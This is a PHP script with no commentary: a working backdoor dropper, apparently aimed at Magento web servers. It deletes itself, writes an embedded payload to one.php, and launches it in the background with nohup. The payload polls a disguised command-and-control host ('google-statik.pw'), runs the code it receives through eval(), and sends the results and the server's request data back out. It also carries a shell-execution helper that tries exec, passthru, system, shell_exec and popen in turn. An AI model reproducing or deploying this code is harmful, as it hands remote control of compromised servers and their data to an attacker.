<?php

function ex($in) {
    $lol = '';
    if (function_exists('exec')) {
        @exec($in, $lol);
        $lol = @join("\n", $lol);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $lol = ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        @system($in);
        $lol = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $lol = shell_exec($in);
    } elseif (is_resource($f = @popen($in, "r"))) {
        $lol = "";
        while (!@feof($f))
            $lol .= fread($f, 1024);
        pclose($f);
    } else
        return "? Unable to execute command\n";
    return ($lol == '' ? "? Query did not return anything\n" : $lol);
}

$data = <<<'HTML'
<?php

set_time_limit(0);

$SERV = unserialize(base64_decode(SERV64));

define("BACK_URL", "http://google-statik.pw/analitics/in.php");
define("DELAY", 3600);

@unlink(__FILE__);

function getCurl($url, $post) {
    $options = array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_ENCODING => "",
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20120101 Firefox/32.0",
        CURLOPT_AUTOREFERER => true,
        CURLOPT_CONNECTTIMEOUT => 120,
        CURLOPT_TIMEOUT => 120,
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    );

    if ($post) {
        $options[CURLOPT_POST] = 1;
        $options[CURLOPT_POSTFIELDS] = $post;
    }



    $ch = curl_init($url);
    curl_setopt_array($ch, $options);
    $content = curl_exec($ch);
    return $content;
}

function ex($in) {
    $lol = '';
    if (function_exists('exec')) {
        @exec($in, $lol);
        $lol = @join("\n", $lol);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $lol = ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        @system($in);
        $lol = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $lol = shell_exec($in);
    } elseif (is_resource($f = @popen($in, "r"))) {
        $lol = "";
        while (!@feof($f))
            $lol .= fread($f, 1024);
        pclose($f);
    } else
        return "? Unable to execute command\n";
    return ($lol == '' ? "? Query did not return anything\n" : $lol);
}

if (function_exists("sys_get_temp_dir")) {
    $flLock = sys_get_temp_dir() . "/mage.lock";
    if (!file_exists($flLock)) {
        file_put_contents($flLock, "one");
    }

    $flLockPointer = fopen($flLock, "a+");

    if (!flock($flLockPointer, LOCK_EX | LOCK_NB)) {
        exit;
    } else {
        fseek($flLockPointer, 0);
        //echo "3";
    }
}

while (true) {
    $url = BACK_URL . "?act=getcmd";
    $url .= "&host=" . urlencode(base64_encode($SERV['HTTP_HOST'] . $SERV['REQUEST_URI']));

    if (defined("SCRIPT_ID")) {
        $url .= "&script_id=" . SCRIPT_ID;
    }

    $data = @getCurl($url, false);
    if ($data) {
        if (!defined("SCRIPT_ID")) {
            $script_id = intval(trim($data));
            if ($script_id)
                define("SCRIPT_ID", $script_id);
            sleep(DELAY);
            continue;
        }

        @eval($data);
        if (isset($r)) {
            $url = BACK_URL . "?act=resultcmd&script_id=" . SCRIPT_ID;
            @getCurl($url, "r=" . urlencode($r));
            unset($r);
        }
    }

    sleep(DELAY);
    //sleep(3600);
}
?>        
HTML;

@unlink(__FILE__);

$dat = serialize($_SERVER);
$dat = base64_encode($dat);

$data = "<?php define('SERV64','$dat');?> $data";

file_put_contents("one.php", $data);

ex("nohup php one.php &");

sleep(5);

if (file_exists("one.php"))
    @unlink("one.php");

?>